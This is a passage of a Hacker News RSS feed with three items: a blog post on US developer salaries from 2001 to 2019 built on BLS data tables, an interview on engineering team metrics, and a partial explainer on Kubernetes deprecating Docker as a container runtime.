<p>One of the big challenges is that this type of information security work is not viewed as glorious or sought …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/">https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/</a></em></p>]]>
            </description>
            <link>https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118736</guid>
            <pubDate>Fri, 12 Feb 2021 21:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolution of Developer Salaries: Looking Back 20 Years]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118722">thread link</a>) | @jkchu
<br/>
February 12, 2021 | https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019 | <a href="https://web.archive.org/web/*/https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <section>
                
                <div>
                    <p>Much has been covered about developer salaries based on coding language, location, job title, and so on. However, little has been done to chart the rise and fall of developer salaries over the years.</p><p>Tracing developer salaries over the last 20 years was an interesting endeavor. Researching the topic meant changing the language I used to search for data. <br>Back in the early 2000s, tech and software were referred to as “Information Technology” (IT) or “Information and Communications Technology” (ICT), developers were still referred to as “IT workers” and little was mentioned about the many specialized roles we have today.</p><p>To go back in time, I mainly referred to data published by the <a href="https://www.bls.gov/oes/tables.htm">U.S. Bureau of Labor Statistics</a> as they offered the most comprehensive year on year data. I looked at data from alternate years, from 2001 to 2019.</p><h2 id="starting-in-the-year-2000">Starting in the year 2000</h2><p>At the turn of the century, <a href="https://money.cnn.com/2000/07/21/career/q_degreecompsci/">CNN Money</a> reported that the average starting salary for an entry-level computer programmer was $40,800.</p><p>Fresh graduates were also paid differently based on the degrees they held:</p><ul><li>Computer engineering: $49,505</li><li>Computer science: $48,740</li><li>Information science: $38,900</li><li>Management information systems: $41,800</li></ul><p>Due to the shortage of skilled workers going into tech fields, salaries in America for IT graduates became more and more competitive. Salaries in 2000 were already 10% higher than the previous year and, apart from information science majors, were well above the <a href="https://www.naceweb.org/job-market/compensation/salary-trends-through-salary-survey-a-historical-perspective-on-starting-salaries-for-new-college-graduates">national average starting salary</a> of $39,824.</p><figure><img src="https://codesubmit.io/blog/content/images/2021/02/cs-grads-2000-2.png"><figcaption>The "IT Industry" looked different in 2000 than it does today</figcaption></figure><p>The following table shows the average annual salary for developers, programmers, and other IT-related job functions, across all industries in the year 2000:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>Annual mean ($)</th>
<th>Annual median ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer &amp; Information Scientists, Researchers</td>
<td>73,430</td>
<td>70,590</td>
</tr>
<tr>
<td>Programmers</td>
<td>60,970</td>
<td>57,590</td>
</tr>
<tr>
<td>Software Engineers - Applications</td>
<td>70,300</td>
<td>67,670</td>
</tr>
<tr>
<td>Software Engineers - Systems Software</td>
<td>70,890</td>
<td>69,530</td>
</tr>
<tr>
<td>Computer Support Specialists</td>
<td>39,680</td>
<td>36,460</td>
</tr>
<tr>
<td>Database Administrators</td>
<td>55,810</td>
<td>51,990</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h2 id="tracing-developer-salaries-in-america-from-2001-to-2019">Tracing developer salaries in America from 2001 to 2019</h2><h3 id="from-2001-to-2011"><br>From 2001 to 2011</h3><p>The graph below shows the annual median and mean salary from 2001 to 2011. These are the relevant job functions I examined, based on the data available from the Bureau of Labor Statistics:</p><ul><li>Computer and information scientists</li><li>Programmers</li><li>Software engineers - Applications</li><li>Software engineers - Systems software</li><li>Database administrators</li></ul><p>What is immediately noticeable is the huge difference between the median and mean salaries for various job functions across all industries, indicating a large difference in salaries for IT workers across the different sectors.</p><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-median-salary1-11-1.png"><figcaption>Annual median salary across all industries for developers, 2001-2011</figcaption></figure><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-mean-salary1-11-6.png"><figcaption>Annual mean salary across all industries for developers, 2001-2011</figcaption></figure><p>In the first decade alone, Americans experienced two huge economic crises, sending rippling effects throughout the American and global labor market. </p><p>2001 was the year the dot-com bubble burst. That year, while wages did not fall despite the dot-com burst, around 400,000 Americans working in IT-related roles lost their jobs going into 2001.</p><p>2008 was when the stock market crashed. Similar to the dot-com burst in 2001, wages in 2008 remained relatively unchanged. However, roughly 111,000 Americans working in IT-related fields lost their jobs going into 2009. </p><p>2008 was also the year when wages began to increase at a slower rate compared to previous years. While individuals enjoyed an average of $5,000 increase every two years previously, after 2008, wages only increased by $2,000 every two years. </p><p>Generally speaking, from 2001 to 2011, individuals working in tech had at least a 21% increase in wages over time. Systems Software Engineers experienced the largest jump in wages, an increase of 35%.</p><p><strong>Average salary increase from 2001-2011:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>2001 ($)</th>
<th>2011 ($)</th>
<th>Increase ($)</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer Software Engineers - Systems Software</td>
<td>74,490</td>
<td>100,420</td>
<td>25,930</td>
<td>+35%</td>
</tr>
<tr>
<td>Computer and Information Scientists</td>
<td>76,970</td>
<td>103,160</td>
<td>26,190</td>
<td>+34%</td>
</tr>
<tr>
<td>Database Administrators</td>
<td>58,420</td>
<td>77,350</td>
<td>18,930</td>
<td>+32%</td>
</tr>
<tr>
<td>Computer Software Engineers - Applications</td>
<td>72,370</td>
<td>92,080</td>
<td>19,710</td>
<td>+27%</td>
</tr>
<tr>
<td>Computer Programmers</td>
<td>62,890</td>
<td>76,010</td>
<td>13,220</td>
<td>+21%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h3 id="from-2013-to-2019">From 2013 to 2019</h3><p>From 2013 onwards, the Bureau of Labor Statistics changed how it categorized tech-related job functions. It added more job functions to the Computing category, mirroring how the profession had evolved since the early 2000s. </p><p>In light of this, I analyzed the broad job function groups available, rather than diving into specific job functions, to get a comprehensive overview of salaries.</p><p>Below are median and mean wages for the following job function groups:</p><ul><li>Computer and information research scientists</li><li>Computer and information analysts</li><li>Software developers and programmers (2019 data included Software Quality Assurance to this group)</li><li>Database and systems administrators and network architects</li><li>Computer support specialists</li></ul><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-median-salary13-19.png"><figcaption>Annual median salary across all industries for developers, 2013-2019</figcaption></figure><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-mean-salary13-19.png"><figcaption>Annual mean salary across all industries for developers, 2013-2019</figcaption></figure><p>In 2013, the <a href="https://www.naceweb.org/job-market/compensation/salary-trends-through-salary-survey-a-historical-perspective-on-starting-salaries-for-new-college-graduates">national American wage</a> for graduates was $45,327. Workers in tech continue to earn well above the national average. </p><p>Similar to the previous period, computer and information researchers continued to earn the most out of the group. In 2019, the average annual income for computer scientists was $127,460, 19% ahead of software developers, and programmers.</p><h2 id="fewer-programmers-more-developers">Fewer "programmers", more "developers"</h2><p>When analyzing salaries, it is also important to look at the employment numbers for job functions to get an indication of the supply and demand for specific skills in the labor market. </p><h3 id="computer-programmers">Computer programmers</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>501,550</td>
<td>62,890</td>
</tr>
<tr>
<td>2003</td>
<td>431,640</td>
<td>64,510</td>
</tr>
<tr>
<td>2005</td>
<td>389,090</td>
<td>67,400</td>
</tr>
<tr>
<td>2007</td>
<td>394,710</td>
<td>72,010</td>
</tr>
<tr>
<td>2009</td>
<td>367,880</td>
<td>74,690</td>
</tr>
<tr>
<td>2011</td>
<td>320,100</td>
<td>76,010</td>
</tr>
<tr>
<td>2013</td>
<td>312,340</td>
<td>80,930</td>
</tr>
<tr>
<td>2015</td>
<td>289,420</td>
<td>84,360</td>
</tr>
<tr>
<td>2017</td>
<td>247,690</td>
<td>87,530</td>
</tr>
<tr>
<td>2019</td>
<td>199,540</td>
<td>92,610</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>In 20 years, we can see a <strong>60% drop</strong> in the number of people employed for computer programming roles in America. Annual wages, on the other hand, increased by 47% in the same period.</p><h3 id="software-developers">Software developers</h3><p>In this section, I removed 2019 data as I was unable to separate developer functions, whether they specialized in applications or systems.</p><p><strong>Applications Developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>361,690</td>
<td>72,370</td>
</tr>
<tr>
<td>2003</td>
<td>392,140</td>
<td>75,750</td>
</tr>
<tr>
<td>2005</td>
<td>455,980</td>
<td>79,540</td>
</tr>
<tr>
<td>2007</td>
<td>495,810</td>
<td>85,660</td>
</tr>
<tr>
<td>2009</td>
<td>495,500</td>
<td>90,170</td>
</tr>
<tr>
<td>2011</td>
<td>539,880</td>
<td>92,080</td>
</tr>
<tr>
<td>2013</td>
<td>643,830</td>
<td>96,260</td>
</tr>
<tr>
<td>2015</td>
<td>747,730</td>
<td>102,160</td>
</tr>
<tr>
<td>2017</td>
<td>849,230</td>
<td>106,710</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The number of software developers hired to work on applications has increased by 135% from 2001 to 2017. Annual salaries increased by 47% in that period.</p><p><strong>Systems developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>261,520</td>
<td>74,490</td>
</tr>
<tr>
<td>2003</td>
<td>285,760</td>
<td>78,400</td>
</tr>
<tr>
<td>2005</td>
<td>320,720</td>
<td>84,310</td>
</tr>
<tr>
<td>2007</td>
<td>349,140</td>
<td>90,780</td>
</tr>
<tr>
<td>2009</td>
<td>385,200</td>
<td>96,620</td>
</tr>
<tr>
<td>2011</td>
<td>387,050</td>
<td>100,420</td>
</tr>
<tr>
<td>2013</td>
<td>373,510</td>
<td>104,480</td>
</tr>
<tr>
<td>2015</td>
<td>390,750</td>
<td>108,760</td>
</tr>
<tr>
<td>2017</td>
<td>394,590</td>
<td>111,780</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>Systems developers increased by only 50% in the same period, with average wages increasing by 50% as well. </p><p><strong>Web developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2013</td>
<td>112,820</td>
<td>67,540</td>
</tr>
<tr>
<td>2015</td>
<td>127,070</td>
<td>70,660</td>
</tr>
<tr>
<td>2017</td>
<td>125,890</td>
<td>74,110</td>
</tr>
<tr>
<td>2019</td>
<td>148,340</td>
<td>82,370</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>For web developers, we can see that the total number of employed professionals increased by 31% in just seven years. The average wages for this job function also increased by 21%.</p><h2 id="are-developer-wages-stagnating">Are developer wages stagnating?</h2><p>Looking at the data, we can see that developer salaries are not increasing at the rate they used to. As we head into 2013 through to 2019, the annual mean salary for developers and programmers increased from $92,820 to $106,980, a mere 15% increase compared to the whopping 21% increase experienced in the previous decade.</p><p><strong>Average salary increase from 2013-2019:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>2013 ($)</th>
<th>2019 ($)</th>
<th>Increase ($)</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer and Information Research Scientists</td>
<td>109,260</td>
<td>127,460</td>
<td>18,200</td>
<td>+17%</td>
</tr>
<tr>
<td>Computer and Information Analysts</td>
<td>86,100</td>
<td>97,570</td>
<td>11,470</td>
<td>+13%</td>
</tr>
<tr>
<td>Software Developers and Programmers</td>
<td>92,820</td>
<td>106,980</td>
<td>14,160</td>
<td>+15%</td>
</tr>
<tr>
<td>Systems Administrators and Network Architects</td>
<td>82,960</td>
<td>96,380</td>
<td>13,420</td>
<td>+16%</td>
</tr>
<tr>
<td>Computer Support Specialists</td>
<td>53,660</td>
<td>59,290</td>
<td>5,630</td>
<td>+10%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>One of the reasons for the slower rate of increase is that the data does not show wages based on seniority and experience. Today, there are more entry-level and junior roles available compared to the early 2000s, and there are more people able to fill those roles. </p><p>Interestingly, in <a href="https://insights.stackoverflow.com/survey/2015#profile-education">2015</a>, Stack Overflow reported that 42% of developers indicated they were self-taught while in <a href="https://insights.stackoverflow.com/survey/2019#education">2019</a>, 63% of developers said they majored in computer science, computer engineering, or software engineering, with 86% of respondents reporting to have taught themselves a new language, framework or tool without taking a formal course. </p><p>Another survey by <a href="https://insights.dice.com/2020/02/21/technology-job-newbies-face-stagnant-salaries/">Dice</a> reported that while wages have dropped for developers with less than two years experience, salaries pick up after the three-year mark. Much like other jobs, developer salaries increase with more experience they accumulate.</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Years of Technical Experience</th>
<th>2018</th>
<th>2019</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Less than 1 year</td>
<td>$57,541</td>
<td>$55,231</td>
<td>-4.00%</td>
</tr>
<tr>
<td>1 - 2 years</td>
<td>$58,755</td>
<td>$58,718</td>
<td>-0.10%</td>
</tr>
<tr>
<td>3 - 5 years</td>
<td>$69,671</td>
<td>$74,706</td>
<td>7.20%</td>
</tr>
<tr>
<td>6 - 10 years</td>
<td>$82,094</td>
<td>$85,927</td>
<td>4.70%</td>
</tr>
<tr>
<td>11 - 15 years</td>
<td>$96,421</td>
<td>$99,138</td>
<td>2.80%</td>
</tr>
<tr>
<td>More than 15 years</td>
<td>$113,503</td>
<td>$114,915</td>
<td>1.20%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h2 id="what-to-expect-in-the-future">What to expect in the future</h2><p>In the years to come, industry experts expect <a href="https://medium.com/predict/are-programmers-headed-toward-another-bursting-bubble-528e30c59a0e">low-level coding and programming jobs to become obsolete</a> with the development of new tools that remove the need to code completely. Take for example the role of Web Developers when it comes to building websites. With popular CMS tools like WordPress and Squarespace, almost anyone can build a website for their business, reducing the need for people who know “just a little bit of front end web development”. </p><p>As automation takes away the need for “basic” coding jobs, new skills or a combination of skills will be needed in the future for roles that don’t even exist yet. The need for field experts and true problem solvers will never disappear. The key is to adapt and learn as new technologies emerge. </p><p><strong>Additional sources:</strong><br><a href="http://www.oecd.org/digital/ieconomy/1939833.pdf">OECD Technology Outlook Report 2000</a><br><a href="http://www.oecd.org/sti/ieconomy/37620123.pdf">OECD Technology Outlook Report 2004</a><br><a href="https://www.oecd-ilibrary.org/docserver/it_outlook-2010-sum-en.pdf?expires=1612698150&amp;id=id&amp;accname=guest&amp;checksum=7DC9765AA37510F78D7BBDA7FF42254D">OECD Information Technology Outlook Summary 2010</a><br><a href="https://docs.google.com/spreadsheets/d/1iGfVr1j-VStKVwSWvVvSo3qbwwHTL_V9tPttpeBTmK4/edit?usp=sharing">BLS data in Google Sheets</a></p>
                </div>
  …</section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019">https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019</a></em></p>]]>
            </description>
            <link>https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118722</guid>
            <pubDate>Fri, 12 Feb 2021 21:26:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Principles of Engineering Metrics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118547">thread link</a>) | @thellimist
<br/>
February 12, 2021 | https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/ | <a href="https://web.archive.org/web/*/https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Kan Yilmaz, Co-Founder at Haystack, on Metrics for Engineering Teams"><div>
<figure><img loading="lazy" width="1024" height="1024" src="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg" alt="" srcset="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg 1024w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-300x300.jpg 300w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-150x150.jpg 150w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-768x768.jpg 768w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair.jpg 1052w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg 1024w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-300x300.jpg 300w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-150x150.jpg 150w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-768x768.jpg 768w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair.jpg 1052w" data-src="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>







<p><strong>Vidal: </strong>[00:00] Good morning today I have with me, Kan Yilmaz. Welcome to ManagersClub.</p>



<p><strong>Kan: </strong>[00:06] Thank you, Vidal.</p>



<h2>About Metrics</h2>



<p><strong>Vidal: </strong>[00:07] Kan you are an expert in engineering metrics. I was really impressed that the discussion we had about engineering metrics last week. Could you tell people how did you get so interested in engineering metrics?</p>



<p><strong>Kan: </strong>[00:20] It wasn’t specifically about engineering metrics. What made me interested in this topic was there were engineers, and we are proud to say that we are logical. We acknowledge data, and we make decisions better based off of data. But once we look into an engineering organization, the application yes, we have lots of data, and we make really good decisions on the application. </p>



<p>But once we go into the process of how do we actually do this engineering process? We don’t have the data, and we don’t use anything. Everything is mostly based on gut feeling. And that made me uncomfortable. I wanted to figure out why engineering among all different organizational teams, such as sales or marketing, did not use any data, whereas every single other one did. So I went into that problem, and that led me to metrics itself.</p>



<p><strong>Vidal: </strong>[01:19] How long have you been working in this field of engineering data and metrics?</p>



<p><strong>Kan: </strong>[01:24] So I had been working on this for more than a year and a half full-time talking to people of understanding why they are using metrics. What is the reason and how does it make our lives better?</p>



<h2>The Goal of Metrics</h2>



<p><strong>Vidal: </strong>[01:39] What is the goal of metrics? Why should we care about these?</p>



<p><strong>Kan: </strong>[01:43] Why do we track anything? Why do we have metrics? The base reason is to align people to a specific goal. For companies, this is revenue. We have a single goal, to make sure that the company is profitable. That is our metric to track.</p>



<p>And this goes into every different even if you’re like having, let’s say you want to lose weight, you have a goal. And the metric represents that, which is how many kilos are you at the moment? For engineering, this was missing. So I was really interested in what should the engineering organization track.</p>



<p><strong>Vidal: </strong>[02:21] You’ve also spoken with hundreds of engineering managers.&nbsp; And that’s how we connected. What are some common mistakes or misunderstandings that managers have on this topic?</p>



<h2>Common Mistakes</h2>



<p><strong>Kan: </strong>[02:32] So there are a few mistakes that they do. The first one is the obvious one, which is big brother. You’re tracking all of my actions, and that sounds like big brother. You don’t want to be tracked — it feels from an engineer’s perspective, it doesn’t feel good. And there’s a reason for this. People have tracked engineers with the wrong metrics. There’s this guy called <a href="https://amzn.to/39W8NhG" target="_blank" rel="noreferrer noopener sponsored nofollow">Eliyahu Goldratt. He wrote the book, The Goal.</a> And in his book, he specifically mentioned that <strong>if you track anybody with metrics that can not control that they won’t care.</strong></p>



<div><figure><a href="https://amzn.to/2N4jp5f" target="_blank" rel="noopener"><img src="https://m.media-amazon.com/images/I/519C2Gz-v2L.jpg" alt="" data-src="https://m.media-amazon.com/images/I/519C2Gz-v2L.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a></figure></div>



<p>And that is what happens in engineering metrics. They try to track engineers with metrics that they don’t control. That is the biggest mistake that I have seen. The second biggest mistake is tracking metrics, which doesn’t and result into the organization success. </p>



<p>So an example of this is the number of commits. That has no correlation whatsoever with the company’s success, and a lot of companies track the number of commits and other ones lines of code. These are numbers. You can track them, but it doesn’t mean anything, and it won’t make your company successful because of this. The engineers themselves —&nbsp; they know it internally. They know that it doesn’t represent the company’s success and they feel like “I’m just being tracked by an arbitrary number.” And it goes back into something that doesn’t matter. </p>



<p>So you need to make sure that you’re tracking two different things. One is that the team can control those metrics. The second point is those metrics actually align with the company’s goals.</p>



<p><strong>Vidal: </strong>[04:13] I think that’s a great point. Yes. If you can’t really control the metric, what do you, what are you going to do? Just pray that it changes? </p>



<h2>Two Best Practices</h2>



<p><strong>Vidal:</strong> We talked about some of the mistakes people make. What do you understand to be some of the best practices? What should people do?</p>



<p><strong>Kan: </strong>[04:26] Specifically for engineering teams, I will be by default, I’ll mention about product engineering. That is where we have figured out what metrics to track. I don’t know about R &amp; D or other departments of engineering, so there’s a distinction between that for product engineering, what are the best practices of tracking.</p>



<p>It goes into the team level. <strong>If you track the individual level, what happens usually is you don’t get the signal of the process. You get the signal of the person, and it’s a shaky number.</strong> A person might work hard today, but tomorrow they might do design, and the next day they might actually have lots of meetings.</p>



<p>And if you try to track it by a single number, you’ll get lots of spiky graphs and that won’t result into actionable results. But if you do that in team level, You will actually get a really good understanding of what the process is. And if I do any kind of iteration in my process, you can see that change in that team’s habits and in that team’s metrics. So that is one best practice that I can say. <strong>Don’t track individuals, track teams</strong>. </p>



<p>The second best practice is, this goes into the mistakes as well, make sure that the team can control the metric itself. Most of the teams that I have seen tried to put product metrics inside engineering organizations.</p>



<p>How I will describe it in this way, monthly active users. I have seen quite a few engineering teams being judged on monthly active users. There are other metrics such as JIRA tasks completed, or it’s usually goes into story points completed. Story points completed is again, it looks fine. You think that it represents the delivery of that specific team.</p>



<p>The problem with story points is it’s inaccurate. It’s inaccurate because the engineers do not fill it in at the correct time. And this produces such a chaotic environment where you don’t get actionable insights from tracking story points to be able to do that. </p>



<p>There is a workaround. It’s not like you cannot do it. You can do it. You need to make sure that story points are accurate and people are not gaming. So there are, those are a bit hard problems to solve. I have seen people solving those problems but <strong>I would generally recommend not tracking product-related metrics for engineering.</strong></p>



<p>There are much, much better metrics to track.&nbsp; We can go over that if you want.</p>



<h2>Metrics for Product Engineering Teams</h2>



<p><strong>Vidal: </strong>[07:00] I’d like to. I think that’s a great point you make about confusing the product metrics.&nbsp; What are some of the appropriate metrics to track for product engineering teams?</p>



<p><strong>Kan: </strong>[07:10] Okay. Let’s go from the fundamentals again. Back to the conversational starting point. I said the metrics they need to represent organization success. What that means is decreased churn, increased revenue. What metrics represent this? </p>



<p>In product engineering, imagine a car. This is the product itself, the organization itself. The driver is the product manager. They can make decisions on where to go on the road. But they don’t decide on the speed. The speed is decided by engineering.&nbsp;The engineering organization is the engine of this car. And how do we make sure that the car goes fast?</p>



<p>That is the <strong>number of successful iterations</strong>. <strong>That is the core metric that product engineering teams should track</strong>. What does the number of successful iterations mean? The number of iterations is quite obvious in the sense of, okay, if I do a deployment, then I did an iteration. I gave value to customers. </p>



<p>But if you just track that metric, what happens is we have seen this in multiple companies. The engineering manager says, “Hey let’s iterate faster. How can we iterate faster?” And the team response. “Let’s not write&nbsp;tests. We spend 20% of our time writing tests…” and that doesn’t work out. Then you have a faulty product.</p>



<p>It’s not a successful iteration. The customer didn’t get value from that deployment. You need to make sure that the iteration is fast and it’s successful. So what are the metrics to track these? I would Put this into five different metrics.&nbsp; I’ll take one step back. I’ll represent this into two different categories.</p>



<p>One product engineering, second DevOps team. I will focus on product engineering and they have four different metrics. It divides into speed and quality. Just like I said, number of successful iterations. The speed part is deployment frequency and cycle time. <strong>Deployment frequency</strong> is how often do you deploy? That’s quite obvious by itself. </p>



<p>Then we go to <strong>cycle time</strong>. Cycle time can be tracked into different ways. Some people track it from JIRA, a single task. How long did it take for a single JIRA task to complete? The second way to track it is how long did a single pull request take to complete by complete I mean start to deployment.</p>



<p>In pull request, you can do this by first commits to production. In JIRA, it can start from triaged to production as well one nuance there is the JIRA. One might not be accurate because engineers it’s like an extra process.&nbsp; It’s not in their habits to track.</p>



<p>Make sure that the JIRA task is correctly tagged, but Github one pull requests. It’s in their habit, it’s in their workflow. They make sure that pull request is tagged correctly because they don’t actually control the tag. They just behave normally and you can get that data from it. So I would recommend specifically focusing on pull requests, but JIRA is also a way to track cycle time.</p>



<p>So what I have talked about was speed, deployment frequency, and cycle time. Now we can go to <strong>quality metrics</strong>, which also divides into two different categories. The pair of deployment frequency is hotfixes. It is called <strong>change failure rates</strong>…</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/">https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/</a></em></p>]]>
            </description>
            <link>https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118547</guid>
            <pubDate>Fri, 12 Feb 2021 21:07:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes is deprecating Docker: what you need to know]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26118044">thread link</a>) | @forrestbrazeal
<br/>
February 12, 2021 | https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/kubernetes-is-deprecating-docker-what-you-need-to-know">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><h2 id="h-kubernetes-is-deprecating-docker">Kubernetes is Deprecating Docker?!</h2><p>For some time now, it seems that when people think of containers, they think of <a href="https://acloudguru.com/course/introduction-to-containers-and-docker">Docker</a> and <a href="https://acloudguru.com/course/kubernetes-deep-dive">Kubernetes</a>. Docker has been the big name when it comes to building and running containers, and Kubernetes has been the big name when it comes to managing and orchestrating them. It might seem a bit shocking to hear that Kubernetes is deprecating support for Docker as a container runtime starting with Kubernetes version 1.20.</p><p>So, I want to take this opportunity to talk about what this change really means, and what Kubernetes users will need to do about it.</p><figure><p> <iframe title="Kubernetes This Month: Container usage in production goes through the roof!" width="500" height="281" src="https://www.youtube.com/embed/KzCaCBIgGvI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure><h2 id="h-what-s-changing">What’s Changing?</h2><p>Kubernetes deprecating Docker is actually not as big of a deal as it sounds, so let’s talk about what is really going on here.</p><p>Kubernetes is removing support for Docker as a <strong>container runtime</strong>. Kubernetes does not actually handle the process of running containers on a machine. Instead, it relies on another piece of software called a <strong>container runtime</strong>.</p><figure><img src="https://lh3.googleusercontent.com/ZdkIrgRa5Kx9RkYvsf_MitDSotGYiXP1dwpSE03SitQcSuHrk8VHKjGr5Mkdo8OXtoFsQpYv4UNaLw7xXLlbcYvvUDNyFM_Tcx2ussVCo7E9Z_aNj_NeN2AXJmLESV60PSp7hfVf" alt=""></figure><p>The container runtime runs containers on a host, and Kubernetes tells the container runtime on each host what to do. You can actually choose from a variety of options when it comes to what software you want to use as your container runtime when running Kubernetes. Up to now, a fairly popular option was to use Docker as the container runtime.</p><p>However, this will no longer be an option in the future. You will still be able to use Docker in other ways that are relevant to Kubernetes (more on that in a moment), but you will not be able to use Docker as the container runtime underneath Kubernetes.</p><h2 id="h-why-is-kubernetes-deprecating-docker">Why is Kubernetes Deprecating Docker?</h2><p>Kubernetes has supported using Docker a container runtime up to this point, so why are they choosing to stop supporting it?</p><p>Kubernetes works with all container runtimes that implement a standard known as the <strong>Container Runtime Interface (CRI)</strong>. This is essentially a standard way of communicating between Kubernetes and the container runtime, and any runtime that supports this standard automatically works with Kubernetes.</p><p>Docker does not implement the Container Runtime Interface (CRI). In the past, there weren’t as many good options for container runtimes, and Kubernetes implemented the Docker shim, an additional layer to serve as an interface between Kubernetes and Docker. Now, however, there are plenty of runtimes available that implement the CRI, and it no longer makes sense for Kubernetes to maintain special support for Docker.</p><h2 id="h-what-s-really-going-on">What’s Really Going On?</h2><p>To really understand why it makes sense for Kubernetes to deprecate Docker, we need to go a little deeper.</p><p>I’ll let you in on a secret: <strong>Docker is not actually a container runtime</strong>! It’s actually a collection of tools that sits on top of a container runtime called <strong>containerd</strong>.</p><p>That’s right! Docker does not run containers directly. It simply creates a more human-accessible and feature-rich interface on top of a separate, underlying container runtime. When it is used as a container runtime for Kubernetes, Docker is just a middle-man between Kubernetes and containerd.</p><figure><img 